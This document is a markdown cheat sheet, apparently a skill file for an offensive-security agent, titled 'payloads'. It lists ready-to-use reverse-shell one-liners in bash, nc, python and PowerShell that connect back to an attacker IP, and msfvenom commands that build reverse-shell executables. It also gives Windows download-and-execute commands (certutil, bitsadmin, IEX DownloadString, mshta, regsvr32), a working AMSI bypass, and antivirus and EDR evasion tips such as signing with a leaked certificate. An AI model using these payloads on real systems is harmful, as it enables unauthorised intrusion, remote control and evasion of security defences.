---
name: payloads
description: Reverse shells, msfvenom, encoders, AMSI/AV evasion, LOLBAS.
tags: [payload, shell, evasion, windows]
---
# Payloads

## Reverse shells
- bash: `bash -i >& /dev/tcp/$IP/4444 0>&1`
- sh: `sh -i >& /dev/tcp/$IP/4444 0>&1` (dash needs `0<&1`)
- nc: `nc -e /bin/sh $IP 4444`; no -e: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP 4444 >/tmp/f`
- python: `python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("$IP",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call(["/bin/sh","-i"])'`
- powershell: `powershell -nop -w hidden -c "$c=New-Object Net.Sockets.TCPClient('$IP',4444);..."`
- Upgrade: `python3 -c 'import pty;pty.spawn("/bin/bash")'`, `Ctrl-Z`, `stty raw -echo; fg`, `export TERM=xterm`.

## msfvenom
- `msfvenom -p windows/x64/shell_reverse_tcp LHOST=$IP LPORT=4444 -f exe -o s.exe`
- `-p linux/x64/meterpreter/reverse_tcp ... -f elf`
- Encoders barely help; `-i 3 -x calc.exe` templates do more.
- Stageless (`shell_reverse_tcp`) for unreliable egress; staged for size.

## Windows execution
- `certutil -urlcache -f http://$IP/a.exe a.exe`
- `bitsadmin /transfer j http://$IP/a.exe C:\a.exe`
- `powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://$IP/a.ps1')"`
- `mshta http://$IP/a.hta`, `rundll32 a.dll,Entry`, `regsvr32 /s /u /i:http://$IP/a.sct scrobj.dll`
- LOLBAS: `wmic process call create`, `msbuild`, `installutil`, `cscript`.

## Evasion
- AMSI: `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)`
- Obfuscate: `Invoke-Obfuscation`, `chameleon`, base64 `-enc` (UTF-16LE).
- AV: strip metadata, sign with a leaked cert, sleep before exec, avoid `meterpreter` strings.
- EDR: prefer native tools (`rundll32`, `regsvr32`, `mshta`) over dropped EXEs.

## Hidden knowledge
- `nc -lvnp 4444` — `-p` is required on some netcat builds.
- Listener on 443/53 blends in; 4444 is often blocked outbound.
- `ConPtyShell` for a real PTY on Windows.
- Test the payload in the target's actual shell (cmd vs PowerShell) — quoting kills more shells than AV.
